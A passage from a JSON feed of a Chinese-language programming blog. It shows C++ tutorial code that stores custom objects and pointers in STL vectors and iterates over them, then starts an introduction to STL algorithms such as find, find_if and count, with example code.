punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Id: \"</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token keyword\">this</span><span class=\"token operator\">-></span>m_Age <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">myPrintFunc1</span><span class=\"token punctuation\">(</span>Person p<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\tp<span class=\"token punctuation\">.</span><span class=\"token function\">Print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">// 存放对象</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">test1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">></span> v<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\tPerson <span class=\"token function\">p1</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"小黑\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\tPerson <span class=\"token function\">p2</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"小白\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\tPerson <span class=\"token function\">p3</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"小绿\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\tv<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\tv<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span>p2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\tv<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span>p3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t<span class=\"token comment\">// 用迭代器调用对象的函数</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Test1 用迭代器调用对象的函数\"</span> <span class=\"token operator\">&lt;&lt;</span>endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator vit <span class=\"token operator\">=</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\tvit<span class=\"token operator\">-></span><span class=\"token function\">Print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t<span class=\"token comment\">// 遍历</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Test1 遍历\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> myPrintFunc1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">myPrintFunc2</span><span class=\"token punctuation\">(</span>Person<span class=\"token operator\">*</span> p<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\tp<span class=\"token operator\">-></span><span class=\"token function\">Print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token comment\">// 存放指针</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">test2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">*</span><span class=\"token operator\">></span> v<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\tPerson <span class=\"token function\">p1</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"小王\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\tPerson <span class=\"token function\">p2</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"小李\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\tPerson <span class=\"token function\">p3</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"小明\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\tv<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\tv<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>p2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\tv<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>p3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\t<span class=\"token comment\">// 用迭代器调用对象的函数</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Test2 用迭代器调用对象的函数\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">*</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator vit <span class=\"token operator\">=</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>vit<span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">Print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\t<span class=\"token comment\">// 遍历</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Test2 遍历\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> myPrintFunc2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\t<span class=\"token function\">test1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>\t<span class=\"token function\">test2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>执行结果如下：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Test1 用迭代器调用对象的函数</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Name: 小黑</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Id: 10</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Test1 遍历</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Name: 小黑</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Id: 10</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Name: 小白</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Id: 20</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Name: 小绿</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Id: 30</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Test2 用迭代器调用对象的函数</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Name: 小王</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Id: 10</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>Test2 遍历</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Name: 小王</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Id: 10</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Name: 小李</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>Id: 20</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>Name: 小明</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>Id: 30</pre></td></tr></table></figure>",
            "tags": [
                "迭代器",
                "使用自定义对象"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/STL/STL%E7%AE%97%E6%B3%95/",
            "url": "https://or0kit.github.io/Programming/STL/STL%E7%AE%97%E6%B3%95/",
            "title": "STL算法",
            "date_published": "2022-04-22T15:53:10.000Z",
            "content_html": "<h1 id=\"stl算法\"><a class=\"anchor\" href=\"#stl算法\">#</a> STL 算法</h1>\n<p>接着学习 STL 算法。</p>\n<h2 id=\"stl算法简介\"><a class=\"anchor\" href=\"#stl算法简介\">#</a> STL 算法简介</h2>\n<p>STL 提供了能在各种容器中使用的通用算法，也就表示可以在不同的容器中使用，比如插入，删除，查找，排序等，这些算法主要是存放在头文件 &lt;algorithm&gt;，&lt;numeric &gt; 和 &lt; functional &gt; 中。</p>\n<p>头文件 &lt;algorithm&gt; 是所有 STL 头文件中最大的一个，其中常用到的功能范围涉及到比较、交换、查找、遍历操作、复制、修改、反转、排序、合并等等。</p>\n<p>头文件 &lt;numeric&gt; 体积很小，只包括几个在序列上面进行简单数学运算的模板函数，包括加法和乘法在序列上的一些操作。</p>\n<p>头文件 &lt;functional&gt; 中则定义了一些模板类，用于声明函数对象。</p>\n<p>STL 提供了大量实现算法的模版函数，只要我们熟悉了 STL 之后，许多代码可以被大大的化简，只需要通过调用一两个算法模板，就可以完成所需要的功能，从而大大地提升效率。</p>\n<p>本章节所学习的算法内容主要是第一个头文件 &lt;algorithm&gt;，第二和第三个只要有所概念即可，无需深究。</p>\n<h2 id=\"stl常见的算法\"><a class=\"anchor\" href=\"#stl常见的算法\">#</a> STL 常见的算法</h2>\n<p>STL 常见的算法有如下三种：</p>\n<ol>\n<li>非可变序列算法</li>\n<li>可变序列算法</li>\n<li>排序算法</li>\n</ol>\n<p>完整版算法见：<span class=\"exturl\" data-url=\"aHR0cDovL2VuLmNwcHJlZmVyZW5jZS5jb20vdy9jcHAvYWxnb3JpdGht\">http://en.cppreference.com/w/cpp/algorithm</span></p>\n<h3 id=\"非可变序列算法\"><a class=\"anchor\" href=\"#非可变序列算法\">#</a> 非可变序列算法</h3>\n<p>非可变序列算法是指不直接修改其所操作的容器内容的算法，如下面的查找、统计、搜索函数：</p>\n<ol>\n<li><code>find</code>  ：查找容器元素</li>\n<li><code>find_if</code>  ：条件查找容器元素</li>\n<li><code>count</code>  ：统计等于某值的容器元素的个数</li>\n<li><code>count_if</code>  ：条件统计</li>\n<li><code>search</code>  ：子序列搜索</li>\n<li><code>search_n</code>  ：重复元素子序列搜索</li>\n</ol>\n<p>代码如下：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">MyPrintFun</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> i <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\t\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">//find 函数</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">Study_find</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token comment\">// 使用 find 函数查找 vector 容器中值为 5 的元素</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator vit <span class=\"token operator\">=</span> <span class=\"token function\">find</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>vit<span class=\"token operator\">==</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"v1中没有元素5\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"v1中有元素5\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">// find_if Func</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">bool</span> <span class=\"token function\">divby5</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t<span class=\"token keyword\">return</span> n <span class=\"token operator\">%</span> <span class=\"token number\">5</span> <span class=\"token operator\">?</span> <span class=\"token number\">0</span> <span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">Study_find_if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token function\">v1</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\tv1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t<span class=\"token comment\">// 使用 find_if 函数查找 vector 容器中值可以被 5 整除的元素</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator vit <span class=\"token operator\">=</span> <span class=\"token function\">find_if</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> divby5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>vit <span class=\"token operator\">==</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"v1中没有可以被5整除的元素\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"发现v1中第一个可以被5整除的元素：\"</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token operator\">*</span>vit <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">Study_count</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token function\">v1</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">15</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\t\tv1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td 